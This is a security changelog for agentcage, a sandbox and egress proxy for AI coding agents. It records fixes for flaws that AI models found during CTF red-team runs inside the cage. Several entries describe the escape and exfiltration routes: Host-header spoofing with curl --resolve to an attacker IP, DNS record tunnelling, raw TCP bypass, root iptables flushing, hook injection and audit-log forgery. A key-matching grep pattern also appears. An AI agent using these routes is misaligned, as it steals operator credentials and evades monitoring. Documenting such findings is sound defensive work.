- **`security(proxy)`: redact injected secrets from capture before disk write.** Pre-this-release, `_maybe_inject` (apple-container `allowlist_addon.py`) and `SecretInjector.inject_request` (container backend) mutated `flow.request.headers` AND `flow.request.body` in place, substituting the placeholder with the real secret value. The capture writer then serialized the post-injection flow to `capture.jsonl` with no symmetric request-side redaction. Result: a request to any allowlisted `inject_to` host wrote the real `ANTHROPIC_API_KEY` (or any injected secret) to disk in a file the cage workload could `cat` (0644 owned by the cage uid via virtiofs identity mapping on apple-container; readable from inside the cage's mount namespace on container backend). The entire point of the proxy holding the real key was so the cage wouldn't see it; capture brought it right back. Real-format `sk-ant-api03-...` (89 chars) bytes were observed in `inbound.request.body` / `outbound.request.body` fields of an existing local e2e test capture during verification. Both backends are fixed in the same release. (#178)
  - **Apple-container** (`src/agentcage/data/apple-container/allowlist_addon.py`): new `_maybe_redact_request(flow)` mirroring `_maybe_redact` but for the request side — same authoritative-host scope (TLS SNI per #175), longest-value-first replacement order, header + body coverage, defensive binary-body skip. Called at the start of `response()`; the `pending["outbound_req"]` capture snapshot is re-taken via `snapshot_request()` after redaction so it overwrites the leaky pre-redaction snapshot. The legacy headers-only capture fallback at the end of `response()` benefits automatically (reads `flow.request.headers` after redaction).
  - **Container backend** (`src/agentcage/data/proxy/secret_injector.py`, `addon.py`): new `SecretInjector.redact_request(flow)` distinct from the existing inject-time `_redact_request` private helper (which is the `redact_to`-tagged no-trust-domain path). The new method runs unconditionally for every rule on every domain post-upstream, purely to scrub the in-memory flow before disk serialization. Wired into `Agentcage.response()` at the very start; `_cap_pending[flow.id]["outbound_req"]` is re-snapshotted with the redacted form.
  - WebSocket path needed no fix — `websocket_message` buffers content BEFORE `inject_ws_content` runs, so the capture buffer already holds placeholder form.
  - 19 new regression tests across `tests/test_secret_injector.py` (9), `tests/test_apple_container.py` (7), and a new `tests/test_addon_capture_redaction.py` (3 end-to-end). The end-to-end tests grep the actual on-disk `capture.jsonl` for the real value and assert it is absent — load-bearing belt against future regressions.

### Operator action required

- **Upgrade and recreate cages** (`cage destroy` + recreate, or `cage update`) to pick up the new addon code.
- **Audit existing `capture.jsonl` files** for previously-captured real secrets. Files are at:
  - Apple-container: `/var/log/agentcage/capture.jsonl` (inside the cage) and the corresponding host-side virtiofs path
  - Container backend: `~/.local/share/agentcage/<cage>/capture/capture.jsonl` on the host
  - Suggested check: `grep -rE 'sk-ant-api[0-9]{2}-[A-Za-z0-9_-]{30,}|sk-or-v1-[a-f0-9]{30,}' ~/.local/share/agentcage/*/capture/capture.jsonl`
- **If real keys are found in capture, rotate the key.** The capture file may have been read by the cage workload or by anything with filesystem access.

### Not addressed in this release

Still queued from prior CTF rounds:

- [#170](https://github.com/agentcage/agentcage/issues/170) — `.git/hooks/` in `/workspace` is a cage→host pivot vector
- [#173](https://github.com/agentcage/agentcage/issues/173) — `.claude/settings.json` is a cage→cage hooks-injection vector
- Apple-container F1/F3/F5 (CTF 0.21.10) — `/var/log/agentcage` 1777 permissions inherited from virtiofs bind allow audit-log forgery and capture-file reads
- Apple-container F6 (CTF 0.21.10) — upstream cert/IP not pinned against dnsmasq resolution; cage can pick attacker-chosen IP if attacker has a valid cert for an allowlisted SNI (high bar)
- DNS subdomain-of-allowlisted-zone forwarding — residual exfil channel for operators who allowlist zones with attacker-controlled delegations (documented limitation, not a code bug)

## [0.21.10] - 2026-05-26

Two cross-backend exfil-channel hotfixes surfaced by cross-model CTF runs (Claude + GPT + Grok) against 0.21.9. **Upgrade recommended for any deployment with `secret_injection:` configured OR any deployment relying on `cage audit` traces for compliance evidence.** Both the container and apple-container backends are affected; both are fixed in the same release.

### Security

- **`security(dns)`: scope dnsmasq recursion to allowlisted zones — close non-A-record exfil channel.** Pre-this-release, the DNS sidecars on both backends only sinkholed A and AAAA queries: `--address=/#/198.51.100.1` (container backend) catches address records, but TXT / MX / NS / SRV / CNAME queries to the same arbitrary names recursed to the configured upstream resolvers. An attacker who owns a delegated subdomain could encode data in DNS labels and exfiltrate via non-A queries fully out-of-band — never touching mitmproxy. The apple-container backend was worse: `data/apple-container/dnsmasq.conf` had `server=1.1.1.1` / `server=8.8.8.8` with no `local=` / `address=` filters at all, so every query of every type forwarded upstream. Now: in allowlist mode, both backends emit per-allowlisted-apex `server=/<apex>/<upstream>` lines instead of a blanket default forwarder, so non-A queries to non-allowed zones return REFUSED at dnsmasq rather than recursing. `--no-resolv` and the `--address=/#/198.51.100.1` A/AAAA catch-all remain as defense-in-depth. The apple-container `dnsmasq.conf` was templated (new `dnsmasq.conf.j2` + `render_dnsmasq_conf()` in `apple_container/wrapper.py`) so the allowlist threads through at cage-build time. Blocklist / open-DNS mode (container backend) intentionally keeps the blanket forwarders. 10 new regression tests pin the bypass shape (regex on `--server <ip>` / `server=[^/]`) so future refactors can't silently regress. (#176)
- **`security(proxy)`: block non-HTTP TCP bypass of L7 policy hooks.** Pre-this-release, the mitmproxy addons on both backends only defined `request` / `response` / `websocket_message` hooks. mitmproxy in transparent mode falls back to `TCPLayer` for traffic it can't parse as HTTP — including raw TCP and non-HTTP-inside-TLS — and `TCPLayer` bridges bytes unmodified to the upstream destination. The cage workload could open a raw socket to any inspected port (80, 443) on any IP, write arbitrary bytes, and have them delivered to the original destination, bypassing the allowlist gate, the inspector chain (`secrets`, `entropy`, `content-type`, `body-size`), and secret injection. Confirmed across both backends in CTF runs: raw `CANARY-<ts>\r\n` bytes to `1.1.1.1:443` elicited a Cloudflare 400 — proving the payload reached upstream. Now: both addons add a `tcp_start(flow)` hook that sets `flow.server_conn.error = "..."` (mitmproxy's `open_connection` in `proxy/server.py:196` checks this after `server_connect` and aborts before opening the upstream socket — load-bearing belt, no bytes leave the cage) AND calls `flow.kill()` for the audit pipeline (with a `flow.killable` guard against double-kill). `tcp_start` covers both raw TCP and non-HTTP-inside-TLS in one hook because `next_layer` falls back to `TCPLayer` for either case. Legitimate HTTP/HTTPS flows go through `HttpLayer` and never produce a `TCPFlow`, so they're untouched. `connection_strategy=lazy` is preserved (smaller diff, no upstream socket wasted on flows that will be killed). 12 new regression tests cover raw TCP to IP, non-HTTP TLS with SNI, unknown-destination defensive path, already-killed flow guard, and a structural assertion that the supervisor keeps `connection_strategy=lazy`. (#177)

### Notes for operators

- Cages must be recreated (`cage destroy` + recreate) or updated (`cage update`) to pick up the new DNS template and the new addon hooks. Existing running cages are unaffected until they restart.
- The `cage audit` JSONL now records killed non-HTTP TCP flows. If you have downstream tooling that strict-mode parses audit entries, verify it tolerates the additive fields introduced in 0.21.9 (`authoritative_host`, `host_mismatch`) and 0.21.10 (TCP-kill entries).
- The apple-container `data/apple-container/dnsmasq.conf` (previously a static file) is now `dnsmasq.conf.j2`. If you forked or patched the static file, port your changes to the template.

### Not addressed in this release

Still queued from prior CTF rounds:

- [#170](https://github.com/agentcage/agentcage/issues/170) — `.git/hooks/` in `/workspace` is a cage→host pivot vector
- [#173](https://github.com/agentcage/agentcage/issues/173) — `.claude/settings.json` is a cage→cage hooks-injection vector
- Apple-container F3 — `/var/log/agentcage` 1777 permissions inherited from virtiofs bind allow audit-log forgery
- Apple-container F4 — virtiofs `/workspace` and `/var/log/agentcage` mounted without `noexec,nosuid,nodev`
- Container backend F6 — secret injector `inject_to: ["anthropic.com"]` matches zone-suffix, not host-exact — key would leak to `www.anthropic.com` if a request hit there

## [0.21.9] - 2026-05-26

Critical hotfix for the apple-container backend. **Upgrade immediately for any apple-container deployment that uses `secret_injection:` (the default for the `claude-code` / `codex` / `pi` scaffolds).** The container backend on Linux is unaffected — its MITM setup does not use `keep_host_header`.

### Security

- **`security(apple-container)`: block Host-header spoofing bypass of allowlist + secret-injection.** Pre-this-release, `data/apple-container/supervisor.sh` started mitmproxy with `--set keep_host_header=true` and the allowlist addon gated requests on `flow.request.pretty_host`. Under `keep_host_header=true`, `pretty_host` reads the **HTTP Host header the cage workload sent** — not the TLS SNI or original destination IP. A cage could `curl --resolve api.anthropic.com:443:<attacker-ip> https://api.anthropic.com/...`: TCP lands on the attacker IP, the addon sees `pretty_host == api.anthropic.com`, the allowlist gate passes, the secret injector substitutes the **real `ANTHROPIC_API_KEY`** into the `x-api-key` header, and mitmproxy forwards the credential to the attacker via SO_ORIGINAL_DST. The audit log records the request as a clean `api.anthropic.com` allow. Discovered by an in-cage CTF run against 0.21.8. (#175)
  - Addon now derives an `_authoritative_host(flow)` from `flow.client_conn.sni` (TLS SNI, which mitmproxy mints/verifies certificates against — `ssl_insecure` is not set, so an attacker-controlled IP cannot complete the upstream handshake under another upstream's name) with a fall-back to the original-dst IP set by mitmproxy in transparent mode for plain HTTP.
  - A new pre-allowlist `_host_header_matches_authoritative` check rejects requests whose Host header disagrees with the authoritative host (subdomain-of-SNI accepted to support wildcard certs); the request returns 403 with `reason="host-header-spoof"` and a new `host_mismatch: true` field in the audit JSONL.
  - Allowlist, secret-injection (`_maybe_inject`), and response redaction (`_maybe_redact`) are all keyed off the authoritative host (defense in depth).
  - Audit JSONL gains an `authoritative_host` field on every entry — additive schema change, consumers that don't recognise it ignore it.
  - Five new regression tests in `tests/test_apple_container.py` cover the spoof bypass, the subdomain-of-SNI exception, and the secret-injection / redaction paths under host mismatch.
  - `keep_host_header=true` is preserved (upstream services that route on Host still see the original header). The supervisor's comment block is rewritten to describe the actual invariant rather than the (incorrect) prior claim that `pretty_host` resolved to the original destination.

### Not addressed in this release

The CTF surfaced more apple-container issues than F1; they're tracked separately and will land in a follow-up:

- F2: `data/apple-container/dnsmasq.conf` forwards every QNAME to upstream resolvers (no `local=` filters) — out-of-band DNS-tunnel exfil channel
- F3: `/var/log/agentcage` permissions inherit 1777 from the host virtiofs bind mount — cage can forge `audit.jsonl` entries
- F4: virtiofs `/workspace` and `/var/log/agentcage` mounted without `noexec,nosuid,nodev`
- F7: `capture.jsonl` is cage-readable when `enable_har: false` (operational-metadata leak)

If you run apple-container with `secret_injection:` configured, F1 is the priority and is fixed by upgrading to 0.21.9. The remaining items will be batched into a follow-up; F2 in particular is high enough to warrant its own near-term release.

## [0.21.8] - 2026-05-26

### Added

- **apple-container honors `container.volumes:`.** Pre-fix the validator emitted `container.volumes: silently has no effect on apple-container (host bind mounts ... — the cage gets no host paths)` and the backend never passed the entries through. Apple's `container run` actually supports `--volume host:cage[:mode]` (we already use it for `/var/log/agentcage` and `/run/agentcage/secrets`), so the fix is to iterate `cfg.container.volumes` in `AppleContainerBackend.start()` and emit one `--volume` per entry. Volume entries are persisted in the per-cage unit JSON at `cage create` time (a `cage update` is the rebuild boundary, matching how the rest of the runtime config flows). Host-path safety mirrors the container backend's quadlet generator: `~` and `$VAR` are expanded; entries with unresolved variables, missing `:`, or whose host path resolves outside `$HOME` are skipped with a warning. This unblocks `agentcage run --project DIR` on apple-container — `${PROJECT_DIR}:/workspace:rw` from the scaffold j2 template now actually lands in the cage.

## [0.21.7] - 2026-05-26

Re-release of 0.21.6 — GitHub Actions silently dropped the tag-push event for the v0.21.6 tag (twice; even after delete + re-push), so the wheel never reached PyPI. No code changes between 0.21.6 and 0.21.7; the only diff is a `workflow_dispatch:` fallback added to the Release workflow so future dropped events can be re-fired by hand. Use 0.21.7 instead of 0.21.6.

## [0.21.6] - 2026-05-26

(Never published to PyPI — see 0.21.7 for the actual ship.)

Two apple-container fixes surfaced while running the agentcage-ctf prompt unattended via `agentcage run claude-code`. **Upgrade recommended for any apple-container user — pre-0.21.6 the `agentcage run` flow on apple-container effectively could not pass a prompt to claude code: the cage was raced and the prompt was mangled, producing a misleading "Invalid API key" error.**

### Fixed

- **`agentcage cage create` / `agentcage run` on apple-container no longer return before the supervisor has finished booting** — race that caused the cage's next operator action to hit it before mitmproxy bound `127.0.0.1:8080`, iptables NAT applied, or secrets were re-staged into `/home/acproxy/secrets/`. Symptom: claude / curl gets "Invalid API key" or HTTP 401 going to `api.anthropic.com` because the literal `{{PLACEHOLDER}}` reaches upstream (the proxy that would substitute it isn't up yet). Apple's `container run -d` returns when the microVM boots — not when the user CMD (`supervisor.sh`) has progressed past its final stage. `AppleContainerBackend.start()` now polls a host-side virtiofs marker (`<logs_dir>/ready`) that supervisor.sh touches as the very last action before `exec capsh`. Stale markers from prior cage lifetimes are cleared before `container run -d`. If the cage exits before signaling ready (supervisor `die`d at some stage), `start()` raises immediately pointing at `container logs <name>` — no more silent "running but broken" cages. (#168)
- **`agentcage run <scaffold> -- <extras>` no longer double-prepends the scaffold's `exec_alias` binary.** Pre-fix, `agentcage run claude-code -- claude --dangerously-skip-permissions -p "<prompt>"` constructed `["claude", "claude", "--dangerously-skip-permissions", "-p", "<prompt>"]` (the scaffold's `exec_aliases.claude = ["claude"]` was prepended to the user's already-binary-leading extras). Claude consumed the second positional `claude` as its prompt and silently ignored `-p` — the agent responded to the literal string "claude" instead of the operator's actual prompt. Now extras are treated as a COMPLETE command (binary + args), matching the docs example `agentcage run codex --name X -- codex --help`. Without extras the scaffold's first alias is still used. Tests cover all four combinations (extras+aliases, extras-without-binary, no extras with aliases, no extras no aliases). (#172)

## [0.21.5] - 2026-05-26

Two cage-isolation fixes surfaced by an in-cage CTF red-team run on `claude-code` and `pi` scaffolds. **Upgrade recommended for any host that runs more than one cage, or that has ever logged in with Claude Code / Codex / pi-style agents on the host machine.** Existing cages need `cage update` (or recreate) to pick up the template changes.

### Security

- **Scaffolds no longer bind-mount host `~/.<agent>` by default.** Pre-this-release, the `claude-code`, `codex`, and `pi` scaffolds shipped `cage.yaml.j2` files with active `~/.claude:/home/node/.claude:rw`, `~/.codex:/home/node/.codex:rw`, and `~/.pi:/home/node/.pi:rw` mounts. The host tree carries credentials, OAuth tokens, conversation transcripts, MCP configs, and project memory — surfaces the cage is supposed to be sealed off from. Worse, the egress proxy allowlist necessarily includes the agent's API host (e.g. `api.anthropic.com`), and inspectors are off by default, so any in-cage code with read access to `.credentials.json` can exfiltrate the OAuth token in a request URL/header/body to the allowlisted host and the proxy passes it. Mount lines are now commented out in all three scaffolds with opt-in framing; in-cage `claude login` (or equivalent) is the recommended persistence path, with a podman named volume as the safe alternative for cross-session token storage. The opt-out → opt-in switch also surfaced a chain of claude-code-specific branches in agentcage core (`_preflight_claude_code_auth`, hard-coded `_SCAFFOLD_ALIASES` / `_NAME_PREFIXES`) which are now replaced with generic `scaffold_aliases()` / `scaffold_name_prefix()` helpers reading from each scaffold's `scaffold.yaml`. (#167)
- **Drop the broad `/agentcage` bind-mount from the cage quadlet.** Pre-this-release, `cage.container.j2` mounted `~/.local/share/agentcage/patches/` read-only into every cage at `/agentcage/`. That directory contains a `resolv-<name>.conf` for every cage the operator has ever created on the host — so any cage could `ls /agentcage/` and enumerate the names + DNS sidecar IPs of every sibling cage. (It also contained vestigial `proxy-fetch.mjs` / `node_modules/` / `package.json` left over from the pre-0.6.3 Node fetch monkey-patch.) The current runtime has no operative consumer of `/agentcage/` — `proxy-fetch.mjs` was removed from active use in 0.6.3, the per-cage `resolv-<name>.conf` is bind-mounted directly at `/etc/resolv.conf` on the next line, and the `nested/*` config files are bind-mounted individually at `/etc/containers/*` and `/usr/local/bin/docker` later in the same template. Broad mount removed; two regression tests added (`test_cage_no_broad_patches_mount`, `test_cage_resolv_conf_still_mounted`). The leftover proxy-fetch / npm artifacts in the operator's host `~/.local/share/agentcage/patches/` are now harmless (no longer mounted into cages); a manual `rm -rf` is sufficient to clean them up. (#169)

## [0.21.4] - 2026-05-26

Bug fix follow-up to 0.21.3 — surfaced during the fresh-Mac verification of last release's security fixes.

### Fixed

- **`agentcage cage destroy` no longer crashes with `FileNotFoundError: 'podman'` on Mac** when the stored deployment config is missing. Pre-fix, `destroy_cage` caught the load failure and fell back unconditionally to `ContainerBackend`, which calls `podman network rm ...` — failing on macOS where podman isn't installed even though the cage is an apple-container artifact. Two real triggers: (a) destroying a name that doesn't exist (e.g. typo); (b) destroying after `agentcage run` exits, since ephemeral mode wipes the deployment dir on the way out. Now each backend exposes `has_resources(name)` (filesystem-based, tool-free) and the destroy path probes apple-container / vm / container in order, dispatches to the one that claims the name, or no-ops cleanly with "Nothing to remove" when nothing exists. An orphaned state dir is still cleaned up. (#166)

## [0.21.3] - 2026-05-25

Two more security fixes for apple-container, follow-ups to the 0.21.2 capsh work. **Upgrade recommended for any apple-container deployment that uses `agentcage run -s KEY=VAL` to pass secrets, or where the `agentcage run` entry point opens an interactive cage session.**

### Security

- **`agentcage run` now wraps the cage session in capsh** — same NoNewPrivs + drop=all + uid 1000 hardening 0.21.2 added to `cage exec`. Pre-this-release, the `agentcage run` apple-container path in `run.py` constructed a raw `container exec` argv inline that inherited the wrapper image's USER (root), so `agentcage run claude-code` (the most common entry point) opened a session as **uid 0** with the full container cap set — even after the 0.21.2 fix to `cage exec`. Now routes through `AppleContainerBackend.exec_argv()` so the same capsh wrap applies. (#165)
- **`apple_container.start()` reads secrets from `pending_secrets.json`, not `os.environ`.** Before: `agentcage cage create -s KEY=VAL` and `agentcage run -s KEY=VAL` staged the value in `<deployment_dir>/pending_secrets.json` but apple-container's `start()` then ignored that file and called `os.environ.get(env_name)` instead — silently dropping the explicit `-s` value AND implicitly leaking arbitrary host shell env vars matching declared secret names. Now `start()` reads only from `pending_secrets.json` (the 0600 plaintext-at-rest persistence mechanism documented in 0.21.1; Keychain integration tracked in #120). Missing values produce a clear `not provided via --set-secret` warning instead of substituting host env. Additionally the pre-0.21.1 cleartext-env fallback for unit JSON without `secret_env_placeholders` is removed — old cages get a warning telling them to `cage update`, rather than silently re-leaking the raw value onto `container run`'s argv. (#164)

## [0.21.2] - 2026-05-25

Two security fixes for `cage exec` on apple-container plus three apple-container parity items (inspectors, protocol_relays, HAR body capture). **Upgrade recommended for any apple-container deployment.**

### Security

- **`cage exec` no longer defaults to root.** Pre-this-release, `agentcage cage exec <cage> -- <cmd>` ran `<cmd>` as root inside the cage — Apple's wrapper image USER is `root` (so the supervisor can boot with CAP_SYS_ADMIN), and `container exec` respects the image USER. That meant the documented `agentcage cage exec claude01 -- claude` invocation had `claude` running as root with **CAP_NET_ADMIN** (`iptables -F` bypasses the egress filter) and **CAP_DAC_OVERRIDE** (reads `/home/acproxy/secrets/*` past mode 0400). Any malicious agent that tricked the operator into running a binary via `cage exec` got automatic root + full caps. Now `cage exec` defaults to uid 1000 via Apple's `-u` flag. `--as-root` opt-in preserves the operator-debug path. `Backend.exec_argv` gains a kw-only `as_root` (default False); container/vm backends accept and ignore it. (#162)
- **`cage exec` wraps in capsh for NoNewPrivs + CapBnd=0.** #162's `-u 1000` cleared the effective/permitted/inheritable cap sets but left the **bounding set non-empty** (CapBnd=a82435fb = CAP_NET_ADMIN + CAP_SYS_ADMIN + the default container set) AND **NoNewPrivs=0**. A setuid-root binary inside the cage could re-grant CapBnd caps via exec — and the cage ships 9 setuid-root binaries (su, mount, umount, passwd, chfn, chsh, gpasswd, newgrp, ssh-keysign). `cage exec` now wraps the user's command in the same capsh invocation supervisor.sh uses at stage 90: `capsh --no-new-privs --drop=all --user=$CAGE_USER --shell=/bin/sh -- -c "exec <user-cmd>"`. The cage exec session now matches the supervisor-spawned workload bit-for-bit: Uid 1000 / all cap sets empty / NoNewPrivs=1. `--as-root` continues to bypass capsh for operator-debug needs. (#163)

### Added

- **`protocol_relays:` wired on apple-container.** Pre-this-PR the parser accepted `protocol_relays:` entries (IMAP, SMTP) but the apple-container backend silently spawned no listeners — outbound mail from the cage just hung. The wrapper now bakes the cage's relay list into `/etc/agentcage/protocol_relays.json`, bundles the shared `data/proxy/{relays,inspectors}` packages into the image, and the addon's `running()` hook dispatches each entry through the same registry the container backend uses. Credentials take the hardened path from #158: written to the per-cage secrets bind mount, re-staged for uid 200 by supervisor stage 35, and read by the addon at relay-start time — never passed as `-e` flags, so `container inspect` and the cage workload's `/proc/self/environ` stay clean. Supervisor stage 80 reads `protocol_relays.json` and opens a per-port loopback ACCEPT so cage→relay connections survive the default-DROP egress lockdown. Inspector-chain wiring on relay `DATA` payloads is the next parity item under #120; per-protocol policy (recipient/sender allowlist, rate caps, size cap) is fully active today.
- **HAR body capture on apple-container.** `cage har <cage>` now exports full request and response bodies (subject to `capture.max_body_size` + binary-skip) when `capture.enable_har: true` is set in `cage.yaml`. Pre-this-PR the addon wrote a headers-only capture record and HAR exports showed `content.size: 0` everywhere — debugging actual payloads required exec'ing into the cage. The in-cage mitmproxy addon now stages inbound + outbound snapshots through the same shared `CaptureWriter` the `container` backend uses, so both backends produce identical HAR 1.2 JSON. `capture.domains` / `capture.exclude_domains` filtering and `--view inbound|outbound` perspective selection both work end-to-end. The `validate_config` warning that `capture.enable_har` was silently dropped on apple-container has been removed. Rebuild required after toggling capture config (`cage update`).
- **Inspector chain on apple-container.** The cage.yaml top-level `inspectors:` list now runs end-to-end on apple-container; previously the allowlist-only addon silently ignored it. Each entry is dispatched through the bundled `data/proxy/inspectors` registry (same one the container backend uses: `content-type`, `body-size`, `entropy`, `secrets`, `domain`). Inspectors run after the host-allowlist gate but BEFORE secret injection so they see placeholders, not real values. A `block` result causes the proxy to synthesize a 403 with the same JSON shape as the allowlist 403 (`{"blocked": true, "reason": ..., "host": ..., "by": "agentcage"}`); `flag` results record in the audit entry without blocking. Per-request audit includes `inspectors: [{name, action, reason, severity}, ...]` so `cage audit --inspector <name>` and `--severity` filtering work identically across backends. `validate_config` warns at parse time for typo'd built-in names and for custom-Python-file inspectors (`path: ...`), which are not yet staged into the wrapper image.

## [0.21.1] - 2026-05-25

Three follow-ups on the 0.21.0 apple-container secret-injection model. The big one is #158 — secrets are no longer cleartext in the cage's env. Together these close out the documented gaps from `docs/apple-container.md` post-0.21.0.

### Added

- **Response-side redaction for `{{SECRET}}` placeholders** on apple-container. The mitmproxy addon already substituted placeholders → real values on outbound requests (PR #151); now it also redacts real values → placeholders on inbound responses. Upstreams that echo secrets back (webhook receivers, debug endpoints) no longer leak them to the cage. Mirror of the container backend's `SecretInjector.redact_response`. Audit entries surface `secrets_redacted: [...]` for visibility. Sorting by descending value length avoids partial leaks when one secret is a substring of another. (#156)
- **`secret_injection.transform` runs end-to-end on apple-container.** Previously `transform: google-jwt-bearer` validated at parse but the addon did direct string substitution only. The addon now loads the bundled `data/proxy/transforms` registry (same one the container backend uses), mints derived values at request time (e.g. fresh OAuth bearer from a service-account JWT), and substitutes those instead of the raw env-passed credential. Fail-closed: if the transform fails to mint, the placeholder is left in place (upstream gets `Bearer {{TOKEN}}` literally and 401s). The "silently has no effect on apple-container" warning no longer fires for known transforms. Per-request audit includes `secret_transforms: {<env>: <transform>}`. (#157)
- **File-based secret delivery — secrets are no longer cleartext in the cage's env.** Pre-0.21.1, the backend env-passed the real secret value via `container run -e NAME=value`. The value was visible in three places: host `ps -ef` (CLI argv), `container inspect <cage>` env config, and the cage workload's `/proc/self/environ`. The cage code that read `os.environ["KEY"]` got the real value, defeating the point of the `{{KEY}}` placeholder. Now: the backend writes each resolved secret to `<state>/<cage>/secrets/<env>` (mode 0600 host-side), bind-mounts the dir into the cage `:ro`, and passes `-e <env>={{PLACEHOLDER}}` (the placeholder, not cleartext) so the cage workload's env carries only the placeholder. Supervisor stage 35 (in-cage, root) re-stages the files into `/home/acproxy/secrets/<env>` (chown 200:200 mode 0400) for mitmproxy, then `umount`s the host bind so the workload (uid 1000) cannot read the bind-mounted files (virtiofs maps file owner through identity; without the umount the workload could still `cat` them). `die` on umount failure — broken stage 35 fails closed rather than silently leaking. The addon reads each rule's value from `/home/acproxy/secrets/<env>` instead of `os.environ`. Backward-compatible: unit JSON without the new `secret_env_placeholders` field falls back to the old cleartext-env delivery so existing cages keep starting without `cage update`. (#158)

### Documentation

- Post-0.21.0 parity rewrite of `docs/apple-container.md`: three new sections covering known gaps with workarounds (6 items, each with symptom + reason + workaround + proper-fix path), quirks worth knowing (8 by-design surprises), and the secret-delivery model with comparison table + end-to-end flow. (#155, #156, #157, #158 — each follow-up updates the relevant section to reflect the fix.)

## [0.21.0] - 2026-05-25

Apple-container backend reaches feature parity with container/vm on the things users actually exercise: init → create → exec → audit/har/verify → backup/restore → secret-injection → domain-management → autostart → config validation all match the other backends end-to-end. 13 PRs ship together; the remaining narrow gaps (alpine full support, `--service proxy|dns`, response redaction, transform functions, macOS Keychain integration, runtime supervisor CI) are documented as follow-ups in #120 with the technical blockers spelled out.

### Fixed (Gap A — crashes / silent breakage)

- `agentcage secret list/set/rm <cage>` on apple-container no longer crashes with `FileNotFoundError: 'podman'` on macOS hosts without podman installed. Same pattern as #139's exec/shell/logs gate: load cage config first, route apple-container through a clean "not yet implemented" exit instead of host podman. The proper apple-container secret store is the env-pass model wired by #151. (#142)
- `cage.yaml`'s `container.cpus` / `container.memory` are now respected on apple-container — previously the backend read only `vm.vcpus` / `vm.mem_mb` and silently dropped the per-cage caps. Apple's CLI is stricter than podman about formats: `--cpus` rejects fractions and `--memory` rejects lowercase suffixes, so the backend normalizes on the way out (`0.5` ceil → `1`, `512m` → `512M`). Backward-compatible unit JSON migration for cages created on 0.20.5 and earlier. (#143)
- `agentcage domain add/rm <cage> <domain>` on apple-container now auto-rebuilds the wrapper image (the dnsmasq + mitmproxy allowlists are baked in at build_artifacts() time) and restarts the cage, so the change takes immediate effect. Previously the command would save cage.yaml + restart but the restart re-executed the OLD image — users had to remember the second `cage update` step. Apple's layer cache makes the rebuild ~1–2s on warm systems. (#144)

### Fixed (Gap C — silently-dropped config knobs)

- `validate_config` now emits a non-fatal warning for each cage.yaml field the apple-container backend silently drops (`volumes`, `named_volumes`, `tmpfs`, `podman_secrets`, `nested_containers`, `userns`, `add_capabilities`, custom `drop_capabilities`, `read_only: false`, `security_label_disable: false`, `capture.enable_har`, `secret_injection.transform`). Warnings fire at every `cage create / update / show` when the field is set to a non-default value. Soft-warn rather than hard-reject because several built-in scaffolds (ubuntu, etc.) set these unconditionally for the container backend; the warnings give the operator the signal without breaking the init path. (#145)

### Added (Plan 2 — observability bridges)

- The apple-container backend now bind-mounts `/var/log/agentcage/` from the microVM to `<state>/<cage>/logs/` on the host (mode 1777, sticky-bit + world-writable since virtiofs locks ownership to the host file's owner; supervisor chowns degrade to best-effort with EPERM tolerated). Unlocks `cage audit` + `cage har` on apple-container and is the foundation for future capture-related features. (#146)
- `agentcage cage audit <cage>` and `agentcage cage har <cage>` no longer exit unsupported on apple-container — they read `audit.jsonl` / `capture.jsonl` from the host-bind-mounted logs dir. The mitmproxy addon now emits JSON lines on every request decision (audit) and every successful round-trip (capture), matching the formats `AuditEntry.from_dict` and `capture_to_har` already understand. Same filtering machinery on the CLI; full body capture deferred. (#147)
- `agentcage cage verify <cage>` on apple-container now runs deeper probes (CA cert exists at `/certs/mitmproxy-ca-cert.pem`, `/etc/resolv.conf` points to local dnsmasq, blocked domain returns 403 from mitmproxy) via `container exec`. Previously the verify command stopped at the backend-agnostic service-status checks with an INFO banner saying deeper checks weren't wired up. (#148)
- The apple-container mitmproxy addon's 403 responses now use the same JSON shape as the container backend (`{"blocked": true, "reason": ..., "host": ..., "by": "agentcage"}` with `Content-Type: application/json`) instead of plain text. Clients that switch on Content-Type or parse the body get consistent behavior across backends. (#149)

### Added (Plan 3 — heavy lift)

- Lifted `cage exec` / `cage logs` / `cage audit` onto the Backend protocol via new `exec_argv` / `logs_argv` / `audit_argv` methods. Each backend (container, vm, apple-container) returns the argv list the CLI executes — keeps backend-specific concerns (Apple's `container exec -it`, Lima's `sg systemd-journal`, container's per-service `journalctl -u`) next to the other backend internals instead of scattered in cli.py if/elif/else. New `BackendUnsupported` exception lets backends return clean error messages (`--service proxy` on apple-container). Migrated cage_exec + the three `_audit_*` helpers; cage_logs's per-backend classifiers stay as-is for a follow-up. (#150)
- Server-side `{{ENV_NAME}}` placeholder injection on apple-container — the cage sees placeholders in its env/code/config; the proxy substitutes real values on the wire when the destination host matches the rule's `inject_to` allow-list. Cage never holds raw secret bytes. Backend forwards `-e NAME=value` to `container run` from `os.environ` at start; the supervisor's mitmproxy addon resolves rules at startup and does in-place placeholder replacement in request headers + text body. Audit entry's `secrets_injected` list surfaces what was swapped. Request-side only in v1; response redaction and transform functions are follow-ups. (#151)
- `agentcage cage backup` and `agentcage cage restore` ported to apple-container with a leaner data model: no host-podman secret store (secrets are env-passed at start — backup records env NAMES so the operator knows what to re-set on the restore host; `--include-secrets` is rejected with a clear message), no named volumes (skipped), capture + audit JSONL pulled from the per-cage logs dir. Restore reconstructs state, optionally rebuilds+starts, warns about expected secret env names so the operator can `export` them before `cage start`. `--name` rewrites cage.yaml's `name:` field for clone-style restores. (#152)
- Apple-container Containerfile now detects alpine (apk) explicitly with an actionable error pointing at the rust-1.88 dependency mitmproxy-rs imposes (alpine ships only 1.87 in 3.22, 1.88 only in edge — unsuitable as a per-cage build dependency). Workarounds surfaced: switch to debian/ubuntu, or use the `vm` isolation backend. Full alpine support requires either upstream musl wheels or a multi-stage builder image; tracked in #120. (#153)
- Per-cage launchd plist autostart on apple-container — opt-in via cage.yaml `apple_container_autostart: true`. Cage re-starts at user login (matches container/vm's quadlet autostart). plist lives at `~/Library/LaunchAgents/io.agentcage.<cage>.plist`; `cage destroy` unloads + removes it. (#154)

### CI

- New `.github/workflows/supervisor.yml` runs shellcheck on supervisor.sh (the security-critical PID 1 of every apple-container cage) and asserts every documented stage marker (10/20/30/40/50/60/70/80/90) is present. Catches POSIX-sh / quoting / unset-var regressions and accidental stage removal during refactors. Full runtime test (CAP_SYS_ADMIN + hidepid + caps assertions) needs docker-in-docker setup; tracked separately. (#154)

## [0.20.5] - 2026-05-25

